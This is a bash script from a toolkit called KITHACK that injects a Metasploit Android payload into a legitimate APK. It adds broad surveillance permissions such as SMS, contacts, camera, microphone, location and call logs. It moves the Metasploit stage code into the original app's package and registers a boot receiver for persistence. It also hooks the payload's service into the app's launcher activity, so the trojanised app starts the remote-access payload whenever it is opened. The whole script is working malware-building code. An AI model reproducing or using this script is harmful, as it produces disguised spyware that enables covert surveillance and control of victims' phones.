#!/usr/bin/env bash
#Copyright 2020 KITHACK
#Written by: Adrian Guillermo
#Facebook: https://facebook.com/adrian.guillermo.22
#Github: https://github.com/AdrMXR

# COLORS
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
BlueF='\e[1;34m' 
RESET="\033[00m" 
orange='\e[38;5;166m'

# VARIABLES GLOBALES
path=$(pwd)
perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'

# Configuracion de RAT
path_name=`head -n 2 output/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'`
path_dash=`head -n 2 output/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'`

# Permisos
echo -e "I: Adding new permissions..."
sleep 1.5
sed -i "5i\ $perms" output/original/AndroidManifest.xml

# Removiendo MainActivity.smali
echo -e "I: Removing MainActivity.smali..."
sleep 1.5
rm output/payload/smali/com/metasploit/stage/MainActivity.smali

# Reconfigurando archivos smali
echo -e "I: Setting smali files..."
sleep 1.5
sed -i "s|Lcom/metasploit|L$path_name|g" output/payload/smali/com/metasploit/stage/*.smali

# Copiando carpeta stage a la carpeta del APK original 
echo -e "I: Moving stage folder to original APK..."
sleep 1.5
cp -r output/payload/smali/com/metasploit/stage output/original/smali/$path_name

# Variables de concatenacion 
amanifest="    </application>"
boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$path_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$path_dash.stage.MainService'"/></application>'

# Concatenando variables
echo -e "I: Setting up AndroidManifest.xml..."
sleep 1.5
sed -i "s|$amanifest|$boot_cmp|g" output/original/AndroidManifest.xml    

# Variables de configuracion 
line_num=`grep -n "android.intent.category.LAUNCHER" output/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'`
android_activity=`grep -B $line_num "android.intent.category.LAUNCHER" output/original/AndroidManifest.xml|grep -B $line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'`
hook_num=`grep -n "    return-void" output/original/smali/$android_activity.smali | cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'`

# Invocando MainService 
starter="   invoke-static {}, L$path_name/stage/MainService;->start()V"
echo -e "I: Invoking MainService..."
sleep 1.5
sed -i "${hook_num}i\ ${starter}" output/original/smali/$android_activity.smali






